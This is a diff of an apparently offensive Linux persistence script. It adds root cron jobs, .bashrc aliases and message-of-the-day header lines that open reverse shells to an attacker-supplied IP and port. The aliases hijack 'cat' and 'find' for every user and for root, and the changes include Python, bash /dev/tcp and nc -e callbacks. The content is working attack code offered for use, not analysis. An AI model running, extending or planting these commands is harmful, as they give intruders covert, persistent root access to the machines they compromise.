@@ -102,6 +102,7 @@ cronjobs() {
     command3="/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$ip\\\",$port));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""    echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
     echo "* * * * * root $comandx" | sudo tee -a /etc/crontab 
     echo "* * * * * root $command2" | sudo tee -a /etc/crontab 
+    echo "* * * * * root $command3" | sudo tee -a /etc/crontab 
     echo -e "\033[0;32m[+] - Cronjobs successfully started."
 }
 
@@ -113,9 +114,13 @@ bashrc() {
         if [ -d "$user" ]; then
           echo "$command" >> "$user/.bashrc"
           echo "$command0" >> "$user/.bashrc"
+          echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc" 
+          echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "$user/.bashrc"
         fi
     echo "$command0" >> "/root/.bashrc"
     echo "$command" >> "/root/.bashrc"
+    echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
+    echo 'alias find=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'' >> "/root/.bashrc" 
     done
     echo -e "\033[0;32m[+] - Bashrc persistence added!"
 }
@@ -156,10 +161,9 @@ rcePersistence() {
 
 MessageOfTheDay() {
     echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence"
-    read -p "Enter your python location? " pythonv
     echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/update-motd.d/00-header 
     echo "nc -e /bin/sh $ip $port" >> /etc/update-motd.d/00-header 
-    echo "$pythonv -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
+    echo "$python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
     echo -e "\033[0;32m[+] - Success!"
 }
 
